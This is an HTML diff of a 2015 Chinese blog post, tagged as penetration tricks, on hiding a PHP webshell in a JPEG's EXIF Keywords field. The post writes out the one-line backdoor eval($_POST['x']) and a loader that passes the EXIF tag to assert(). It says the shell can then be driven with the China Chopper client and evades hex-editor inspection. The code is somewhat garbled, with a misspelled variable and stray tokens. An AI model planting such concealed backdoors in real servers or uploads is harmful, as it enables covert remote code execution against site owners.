@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>Archives: 2015 | FreeV&#39;s Bolg</title>
+  <title>php高级图片隐藏马 | FreeV&#39;s Bolg</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -84,7 +84,7 @@
 </head>
 
 <!--
-<body class="home-template">
+<body class="post-template">
 -->
 <body id="index" class="lightnav animsition">
 
@@ -215,55 +215,66 @@
 
         <!-- ============================ END Hero Image =========================== -->
       
-
-
-<section id="services">
+<section id="intro">
     <div class="container">
-        <div class="row">
-            <div class="col-md-10 col-md-offset-1">
-                <div class="row boxes">
-                    
-                    
-                        
-                        
-                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
-                            
-                              <h4 class="title"><a href="/2015/12/11/php高级图片隐藏马/">php高级图片隐藏马</a></h4>
-                            
-                            <p><time datetime="2015-12-11T07:47:50.000Z"><a href="/2015/12/11/php高级图片隐藏马/">2015-12-11</a></time></p>
-                        </div>
-                    
-                        
-                        
-                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
-                            
-                              <h4 class="title"><a href="/2015/12/09/php弱类型安全/">php弱类型安全</a></h4>
-                            
-                            <p><time datetime="2015-12-09T04:51:21.000Z"><a href="/2015/12/09/php弱类型安全/">2015-12-09</a></time></p>
-                        </div>
-                    
-                        
-                        
-                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
-                            
-                              <h4 class="title"><a href="/2015/12/09/hello-world/">Hello World</a></h4>
-                            
-                            <p><time datetime="2015-12-09T04:45:45.799Z"><a href="/2015/12/09/hello-world/">2015-12-09</a></time></p>
-                        </div>
-                    
-                </div>
-            </div>    
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2015-12-11T07:47:50.000Z" itemprop="datePublished">
+          2015-12-11
+      </time>
+    
+    
+    | 
+    <a href='/tags/渗透技巧/'>渗透技巧</a>
+    
+    
+</span>
+                <h1>php高级图片隐藏马</h1>
+            </div>
         </div>
-    </div>
-</section> 
+        <div class="col-md-8 col-md-offset-2">
+      		<h2 id="0x00_EXIF"><a href="#0x00_EXIF" class="headerlink" title="0x00 EXIF"></a>0x00 EXIF</h2><p>  </p><h4>Exif是一种图像文件格式，它的数据存储与JPEG格式是完全相同的。实际上Exif格式就是在JPEG格式头部插入了数码照片的信息，包括拍摄时的光圈、快门、白平衡、ISO、焦距、日期时间等各种和拍摄条件以及相机品牌、型号、色彩编码、拍摄时录制的声音以及GPS全球定位系统数据、缩略图等。你可以利用任何可以查看JPEG文件的看图软件浏览Exif格式的照片，但并不是所有的图形程序都能处理Exif信息<p></p>
+<p>  </p><h4>php 中exif_read_data,可以读取EXIF的信息头，但是需要开启php_exif的模板<p></p>
+  <figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line"></span><br><span class="line"><span class="variable">$exif</span>=exif_read_data(<span class="string">'11.jpg'</span>);</span><br><span class="line">var_dump(<span class="variable">$exif</span>);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>  </p><h4>输出<br>  <figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span></span><br><span class="line"><span class="string">'FileName'</span> =&gt; string <span class="string">'11.jpg'</span> (length=<span class="number">6</span>)</span><br><span class="line"><span class="string">'FileDateTime'</span> =&gt; <span class="keyword">int</span> <span class="number">1449824391</span></span><br><span class="line"><span class="string">'FileSize'</span> =&gt; <span class="keyword">int</span> <span class="number">96252</span></span><br><span class="line"><span class="string">'FileType'</span> =&gt; <span class="keyword">int</span> <span class="number">2</span></span><br><span class="line"><span class="string">'MimeType'</span> =&gt; string <span class="string">'image/jpeg'</span> (length=<span class="number">10</span>)</span><br><span class="line"><span class="string">'SectionsFound'</span> =&gt; string <span class="string">'ANY_TAG, IFD0, EXIF'</span> (length=<span class="number">19</span>)</span><br><span class="line"><span class="string">'COMPUTED'</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span></span><br><span class="line">    <span class="string">'html'</span> =&gt; string <span class="string">'width="600" height="800"'</span> (length=<span class="number">24</span>)</span><br><span class="line">    <span class="string">'Height'</span> =&gt; <span class="keyword">int</span> <span class="number">800</span></span><br><span class="line">    <span class="string">'Width'</span> =&gt; <span class="keyword">int</span> <span class="number">600</span></span><br><span class="line">    <span class="string">'IsColor'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">    <span class="string">'ByteOrderMotorola'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line"><span class="string">'Exif_IFD_Pointer'</span> =&gt; <span class="keyword">int</span> <span class="number">2110</span></span><br></pre></td></tr></table></figure><p></p>
+<h2 id="0x01__u7325_u7410_u5229_u7528"><a href="#0x01__u7325_u7410_u5229_u7528" class="headerlink" title="0x01 猥琐利用"></a>0x01 猥琐利用</h2><p></p><h4>右键点击图片，属性-》详细信息-》标记-》填写shell;<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span></span><br><span class="line">  <span class="string">'FileName'</span> =&gt; string <span class="string">'11.jpg'</span> (length=<span class="number">6</span>)</span><br><span class="line">  <span class="string">'FileDateTime'</span> =&gt; <span class="keyword">int</span> <span class="number">1449825529</span></span><br><span class="line">  <span class="string">'FileSize'</span> =&gt; <span class="keyword">int</span> <span class="number">96252</span></span><br><span class="line">  <span class="string">'FileType'</span> =&gt; <span class="keyword">int</span> <span class="number">2</span></span><br><span class="line">  <span class="string">'MimeType'</span> =&gt; string <span class="string">'image/jpeg'</span> (length=<span class="number">10</span>)</span><br><span class="line">  <span class="string">'SectionsFound'</span> =&gt; string <span class="string">'ANY_TAG, IFD0, EXIF, WINXP'</span> (length=<span class="number">26</span>)</span><br><span class="line">  <span class="string">'COMPUTED'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span></span><br><span class="line">      <span class="string">'html'</span> =&gt; string <span class="string">'width="600" height="800"'</span> (length=<span class="number">24</span>)</span><br><span class="line">      <span class="string">'Height'</span> =&gt; <span class="keyword">int</span> <span class="number">800</span></span><br><span class="line">      <span class="string">'Width'</span> =&gt; <span class="keyword">int</span> <span class="number">600</span></span><br><span class="line">      <span class="string">'IsColor'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">      <span class="string">'ByteOrderMotorola'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">  <span class="string">'Exif_IFD_Pointer'</span> =&gt; <span class="keyword">int</span> <span class="number">2110</span></span><br><span class="line">  <span class="string">'Keywords'</span> =&gt; string <span class="string">'shell'</span> (length=<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p></p>
+<p></p><h4>可见下最下面多了一条’Keywords’ =&gt; string ‘shell’ (length=5)<p></p>
+<p></p><h4>下面构造一句话,右键点击图片，属性-》详细信息-》标记-》填写<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="variable">$_POST[</span><span class="string">'x'</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure><p></p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">true<span class="variable">$exif</span>=exif_read_data(<span class="string">'11.jpg'</span>);</span><br><span class="line">truevar_dump(<span class="variable">$exif</span>);</span><br><span class="line">trueassert(<span class="variable">$exit</span>[<span class="string">'Keywords'</span>]);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
+<p></p><h4>菜刀连之，即可,<p></p>
+<h2 id="0x02_u603B_u7ED3"><a href="#0x02_u603B_u7ED3" class="headerlink" title="0x02总结"></a>0x02总结</h2><p></p><h4>他与普通图片马的区别在于，但当你用16进制编译器打开之后你是找不到关于shell的字符串。<p></p>
+</h4></h4></h4></h4></h4></h4></h4></h4>
+            <div class="clearfix"></div>
+            <hr class="nogutter">
+        </div>
+        <nav class="pagination" role="pagination">
+    
+    
+    <a class="pull-right" href="/2015/12/09/php弱类型安全/">
+        php弱类型安全 →
+    </a>
+    
+</nav>
 
-<section id="statement">
-    <div class="container text-center wow fadeInUp" data-wow-delay="0.5s">
-        <div class="row">
-            <p>对知识的渴望是你前进的最大动力</p>
-        </div>
+        <div class="duoshuo">
+<div class="ds-thread" data-thread-key="2015/12/11/php高级图片隐藏马/" data-title="php高级图片隐藏马" data-url="http://yoursite.com/2015/12/11/php高级图片隐藏马/"></div>
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"duoshuo_name"};
+(function() {
+	var ds = document.createElement('script');
+	ds.type = 'text/javascript';ds.async = true;
+	ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+	ds.charset = 'UTF-8';
+	(document.getElementsByTagName('head')[0] 
+	 || document.getElementsByTagName('body')[0]).appendChild(ds);
+})();
+</script>
+</div>
     </div>
 </section>
+
+
       
 <!-- ============================ Footer =========================== -->
 
